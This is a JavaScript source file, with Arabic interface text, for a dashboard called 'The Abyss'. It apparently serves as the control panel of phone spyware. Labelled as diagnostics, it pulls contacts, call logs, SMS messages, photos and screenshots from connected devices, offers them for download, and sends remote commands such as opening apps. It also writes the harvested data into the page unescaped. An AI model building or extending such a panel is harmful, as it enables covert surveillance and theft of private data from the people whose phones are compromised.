// ============================================
// The Abyss - Dashboard Logic
// ============================================

let socket = null;
let currentDeviceId = null;
let devicesList = [];

// ============================================
// 1. الاتصال بالخادم عبر Socket.io
// ============================================
function connectSocket() {
    socket = io();

    socket.on('connect', () => {
        console.log('[WS] Connected to server');
    });

    socket.on('devices_list', (devices) => {
        devicesList = devices || [];
        renderDevices();
    });

    socket.on('device_update', (data) => {
        console.log('[WS] Device update:', data);
        loadDevices();
    });

    socket.on('diagnostics_update', (data) => {
        if (data.deviceId === currentDeviceId) {
            loadAllData();
        }
    });

    socket.on('command_result', (data) => {
        appendLog(`✅ نتيجة: ${data.result.action || 'unknown'} - ${data.result.status || 'done'}`);
    });

    socket.on('disconnect', () => {
        console.log('[WS] Disconnected');
    });
}

// ============================================
// 2. جلب قائمة الأجهزة
// ============================================
async function loadDevices() {
    try {
        const res = await fetch('/api/devices');
        const data = await res.json();
        devicesList = data.devices || [];
        renderDevices();
    } catch (e) {
        console.error('Error loading devices:', e);
    }
}

function renderDevices() {
    const select = document.getElementById('deviceSelect');
    const currentVal = currentDeviceId;

    select.innerHTML = '<option value="">اختر الجهاز...</option>';

    if (devicesList.length === 0) {
        select.innerHTML = '<option value="">لا توجد أجهزة متصلة</option>';
        updateStatus(null);
        return;
    }

    devicesList.forEach(dev => {
        const opt = document.createElement('option');
        opt.value = dev.id;
        opt.textContent = `${dev.model || dev.id} (${dev.status || 'offline'})`;
        select.appendChild(opt);
    });

    // اختيار أول جهاز تلقائياً
    if (!currentVal && devicesList.length > 0) {
        const online = devicesList.find(d => d.status === 'online') || devicesList[0];
        select.value = online.id;
        selectDevice(online.id);
    } else if (currentVal) {
        select.value = currentVal;
        const dev = devicesList.find(d => d.id === currentVal);
        updateStatus(dev);
    }
}

function updateStatus(device) {
    const dot = document.getElementById('statusDot');
    const text = document.getElementById('statusText');

    if (!device || device.status !== 'online') {
        dot.classList.remove('online');
        text.textContent = 'غير متصل';
        text.style.color = 'var(--red)';
        return;
    }

    dot.classList.add('online');
    text.textContent = 'متصل';
    text.style.color = 'var(--green)';
}

// ============================================
// 3. اختيار جهاز
// ============================================
function selectDevice(deviceId) {
    currentDeviceId = deviceId;

    if (!deviceId) {
        updateStatus(null);
        return;
    }

    const dev = devicesList.find(d => d.id === deviceId);
    updateStatus(dev);

    // جلب البيانات
    loadAllData();

    // تحديث دوري
    if (window.dataInterval) clearInterval(window.dataInterval);
    window.dataInterval = setInterval(loadAllData, 5000);
}

// ============================================
// 4. تحميل كل البيانات
// ============================================
async function loadAllData() {
    if (!currentDeviceId) return;

    try {
        const res = await fetch(`/api/diagnostics/${encodeURIComponent(currentDeviceId)}`);
        const data = await res.json();
        const diag = data.diagnostics || {};

        // جهات الاتصال
        if (diag.contacts) {
            renderContacts(diag.contacts);
        }

        // المكالمات
        if (diag.calls) {
            renderCalls(diag.calls);
        }

        // الرسائل
        if (diag.messages) {
            renderMessages(diag.messages);
        }

        // الصور
        if (diag.media) {
            renderMedia(diag.media);
        }

        // معلومات الشبكة
        renderNetworkInfo();

    } catch (e) {
        console.error('Error loading data:', e);
    }
}

// ============================================
// 5. عرض جهات الاتصال
// ============================================
function renderContacts(data) {
    const tbody = document.querySelector('#contactsTable tbody');
    if (!tbody) return;

    const items = data.items || [];
    tbody.innerHTML = '';

    if (items.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" class="empty-msg">لا توجد بيانات</td></tr>';
        return;
    }

    items.forEach(item => {
        const parts = item.split(':');
        const name = parts[0] || 'غير معروف';
        const phone = parts.slice(1).join(':').trim() || '-';
        tbody.innerHTML += `<tr><td>${name}</td><td>${phone}</td></tr>`;
    });

    // تحديث العنوان بالعدد
    const h3 = document.querySelector('#contactsTab h3');
    if (h3) h3.textContent = `📇 جهات الاتصال (${data.count || items.length})`;
}

// ============================================
// 6. عرض المكالمات
// ============================================
function renderCalls(data) {
    const tbody = document.querySelector('#callsTable tbody');
    if (!tbody) return;

    const items = data.items || [];
    tbody.innerHTML = '';

    if (items.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" class="empty-msg">لا توجد بيانات</td></tr>';
        return;
    }

    items.forEach(item => {
        tbody.innerHTML += `<tr><td>مكالمة</td><td>${item}</td></tr>`;
    });

    const h3 = document.querySelector('#callsTab h3');
    if (h3) h3.textContent = `📞 سجل المكالمات (${data.count || items.length})`;
}

// ============================================
// 7. عرض الرسائل
// ============================================
function renderMessages(data) {
    const tbody = document.querySelector('#messagesTable tbody');
    if (!tbody) return;

    const items = data.items || [];
    tbody.innerHTML = '';

    if (items.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" class="empty-msg">لا توجد بيانات</td></tr>';
        return;
    }

    items.forEach(item => {
        const parts = item.split('->');
        const from = parts[0]?.trim() || '-';
        const body = parts[1]?.trim() || '-';
        tbody.innerHTML += `<tr><td>${from}</td><td>${body}</td></tr>`;
    });

    const h3 = document.querySelector('#messagesTab h3');
    if (h3) h3.textContent = `📩 الرسائل SMS (${data.count || items.length})`;
}

// ============================================
// 8. عرض الصور
// ============================================
function renderMedia(data) {
    const studioGallery = document.getElementById('studioGallery');
    const screenshotsGallery = document.getElementById('screenshotsGallery');

    if (studioGallery) studioGallery.innerHTML = '';
    if (screenshotsGallery) screenshotsGallery.innerHTML = '';

    const items = data.items || [];
    let camCount = 0;
    let scrCount = 0;

    items.forEach(filePath => {
        const fileName = filePath.split('/').pop();
        const isScreenshot = filePath.includes('Screenshots');

        const card = `
            <div class="gallery-item">
                <div class="gallery-thumb">${isScreenshot ? '📸' : '📷'}</div>
                <div class="gallery-name">${fileName}</div>
                <a href="${filePath}" download class="download-btn">⬇ تحميل</a>
            </div>
        `;

        if (isScreenshot) {
            if (screenshotsGallery) screenshotsGallery.innerHTML += card;
            scrCount++;
        } else {
            if (studioGallery) studioGallery.innerHTML += card;
            camCount++;
        }
    });

    const studioH3 = document.querySelector('#studioTab h3');
    if (studioH3) studioH3.textContent = `🖼️ معرض الصور (${camCount})`;

    const scrH3 = document.querySelector('#screenshotsTab h3');
    if (scrH3) scrH3.textContent = `📸 لقطات الشاشة (${scrCount})`;
}

// ============================================
// 9. معلومات الشبكة
// ============================================
function renderNetworkInfo() {
    const dev = devicesList.find(d => d.id === currentDeviceId);
    if (!dev) return;

    const status = document.getElementById('netStatus');
    const deviceId = document.getElementById('netDeviceId');
    const lastSeen = document.getElementById('netLastSeen');

    if (status) status.textContent = dev.status === 'online' ? 'متصل ✅' : 'غير متصل ❌';
    if (deviceId) deviceId.textContent = dev.id || '-';
    if (lastSeen && dev.lastSeen) {
        lastSeen.textContent = new Date(dev.lastSeen).toLocaleString('ar-EG');
    }
}

// ============================================
// 10. إرسال الأوامر
// ============================================
async function sendCommand(action, data = "") {
    if (!currentDeviceId) {
        alert('الرجاء اختيار جهاز أولاً');
        return;
    }

    try {
        const res = await fetch(`/api/commands/${encodeURIComponent(currentDeviceId)}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action, data })
        });
        const result = await res.json();

        if (result.ok) {
            appendLog(`📤 تم إرسال الأمر: ${action}`);
        } else {
            appendLog(`❌ فشل إرسال الأمر: ${action}`);
        }
    } catch (e) {
        appendLog(`❌ خطأ: ${e.message}`);
    }
}

function openApp() {
    const pkg = prompt('أدخل اسم حزمة التطبيق (مثال: com.whatsapp):');
    if (pkg) sendCommand('open_app', pkg);
}

function appendLog(msg) {
    const log = document.getElementById('commandLog');
    if (!log) return;

    const time = new Date().toLocaleTimeString('ar-EG');
    const line = document.createElement('p');
    line.textContent = `[${time}] ${msg}`;
    log.appendChild(line);

    // التمرير لأسفل
    log.scrollTop = log.scrollHeight;
}

// ============================================
// 11. تبديل التبويبات
// ============================================
function switchTab(tabName) {
    document.querySelectorAll('.menu-btn').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));

    const btn = document.querySelector(`[onclick="switchTab('${tabName}')"]`);
    if (btn) btn.classList.add('active');

    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

// ============================================
// 12. التشغيل التلقائي
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    connectSocket();
    loadDevices();
    setInterval(loadDevices, 10000);
});